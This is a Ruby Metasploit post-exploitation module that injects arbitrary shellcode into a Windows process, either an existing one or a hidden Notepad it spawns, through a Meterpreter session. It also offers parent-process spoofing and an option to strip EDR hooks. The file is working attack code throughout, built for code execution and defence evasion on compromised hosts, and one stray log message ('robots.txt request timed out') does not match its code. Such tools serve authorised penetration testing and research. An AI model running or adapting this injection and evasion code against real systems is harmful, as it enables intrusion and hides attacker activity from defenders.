##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
require "timeout"
require 'msf/core/post/common'


class MetasploitModule < Msf::Post
  include Msf::Post::Common
  include Msf::Post::Windows::Process


  def initialize(info={})
    super( update_info( info,
      'Name'          => 'Windows Manage Memory Shellcode Injection Module',
      'Description'   => %q{
        This module will inject into the memory of a process a specified shellcode.
      },
      'License'       => MSF_LICENSE,
      'Author'        => [ 'phra <https://iwantmore.pizza>' ],
      'Platform'      => [ 'win' ],
      'SessionTypes'  => [ 'meterpreter' ]
    ))

    register_options(
            [
                    OptString.new('SHELLCODE_FILE', [true, 'File store shellcode', nil]),
                    OptEnum.new('ARCH', [true, 'shellcode Arch.', ARCH_X86, [ARCH_X86, ARCH_X64]]),
                    OptInt.new('PID', [false, 'Process Identifier to inject of process to inject the shellcode. (0 = new process)', 0]),
                    OptInt.new('PPID', [false, 'Process Identifier for PPID spoofing when creating a new process. (0 = no PPID spoofing)', 0]),
                    OptBool.new('CHANNELIZED', [true, 'Retrieve output of the process', false]),
                    OptBool.new('INTERACTIVE', [true, 'Interact with the process', false]),
                    OptBool.new('HIDDEN', [true, 'Spawn an hidden process', true]),
                    OptBool.new('AUTOUNHOOK', [true, 'Auto remove EDRs hooks', false]),
                    OptInt.new('WAIT_UNHOOK', [true, 'Seconds to wait for unhook to be executed', 5]),
                    OptInt.new('WAIT_OUTPUT', [true, 'Seconds to wait for process output', 3]),
            ])
    register_advanced_options(
            [
                    OptBool.new('KILL', [true, 'Kill the injected process at the end of the task', false])
            ]
    )
  end

  # Run Method for when run command is issued
  def run
    # syinfo is only on meterpreter sessions
    vprint_status("Running module against #{sysinfo['Computer']}") if not sysinfo.nil?


    if File.file?(File.join(Msf::Config.loot_directory, datastore['SHELLCODE_FILE']))
      @shellcode_path = File.join(Msf::Config.loot_directory, datastore['SHELLCODE_FILE'])
    elsif File.file?(datastore['SHELLCODE_FILE'])
      @shellcode_path = datastore['SHELLCODE_FILE']
    else
      pub_json_result(false,
                      "#{datastore['SHELLCODE_FILE']} not found",
                      nil,
                      self.uuid)
      return
    end


    # Set variables
    shellcode = IO.read(@shellcode_path)
    pid       = datastore['PID']
    ppid      = datastore['PPID']
    bits      = datastore['ARCH']
    p         = nil



    # Check
    if bits == ARCH_X64 and client.arch == ARCH_X86
      vprint_error("You are trying to inject to a x64 process from a x86 version of Meterpreter.")
      pub_json_result(false,
                      "You are trying to inject to a x64 process from a x86 version of Meterpreter.",
                      nil,
                      self.uuid)
      return false
    end

    # Start Notepad if Required
    if pid == 0

      notepad_pathname = get_notepad_pathname(bits, client.sys.config.getenv('windir'), client.arch)
      vprint_status("Starting  #{notepad_pathname}")
      proc = client.sys.process.execute(notepad_pathname, nil, {
              'Hidden'      => datastore['HIDDEN'],
              'Channelized' => datastore['CHANNELIZED'],
              'Interactive' => datastore['INTERACTIVE'],
              'ParentPid' => datastore['PPID']
              # 'Suspended'   => true
      })
      vprint_status("Spawned Notepad process #{proc.pid}")
    else
      if datastore['CHANNELIZED'] && datastore['PID'] != 0
        vprint_error("It's not possible to retrieve output when injecting existing processes!")
        pub_json_result(false,
                        "It's not possible to retrieve output when injecting existing processes!",
                        nil,
                        self.uuid)
        return

      end
      unless has_pid?(pid)
        vprint_error("Process #{pid} was not found")
        pub_json_result(false,
                        "Process #{pid} was not found",
                        nil,
                        self.uuid)
        return false
      end
      begin
        proc = client.sys.process.open(pid.to_i, PROCESS_ALL_ACCESS)
      rescue Rex::Post::Meterpreter::RequestError => e
        vprint_error(e.to_s)
        vprint_error("Failed to open pid #{pid.to_i}")

        pub_json_result(false,
                        "Failed to open pid #{pid.to_i}",
                        nil,
                        self.uuid)
      end
      vprint_status("Opening existing process #{proc.pid}")
    end


    if datastore['AUTOUNHOOK']
      vprint_status("Executing unhook")
      vprint_status("Waiting #{datastore['WAIT_UNHOOK']} seconds for unhook Reflective DLL to be executed...")
      unless inject_unhook(proc, bits, datastore['WAIT_UNHOOK'])
        vprint_error("Failed to open pid #{pid.to_i}")
        pub_json_result(false,
                        "Unknown target arch; unable to assign unhook dll",
                        nil,
                        self.uuid)
        return
      end
    end
    begin
      output = inject(shellcode, proc)
      if datastore['KILL']
        print_good("Killing process #{proc.pid}")
        client.sys.process.kill(proc.pid)
      end
      pub_json_result(true,
                      nil,
                      {:pid => proc.pid, :output => output},
                      self.uuid)
    rescue ::Exception => e
      vprint_error("Failed to inject Payload to #{proc.pid}!")
      vprint_error(e.to_s)

      pub_json_result(false,
                      "Failed to inject Payload to #{proc.pid}!",
                      nil,
                      self.uuid)

    end

  end

  def inject(shellcode, proc)
    mem = inject_into_process(proc, shellcode)
    proc.thread.create(mem, 0)
    vprint_good("Successfully injected payload into process: #{proc.pid}")
    if datastore['CHANNELIZED'] && datastore['PID'] == 0
      print_status("Retrieving output")
      # data = proc.channel.read
      # print_line(data) if data
      output = ""
      begin
        Timeout.timeout(datastore['WAIT_OUTPUT']) do
          while (tmp = proc.channel.read)
            output = output +tmp
          end
        end
      rescue Timeout::Error
        vprint_status("robots.txt request timed out")
      end
    end
    return output
  end
end
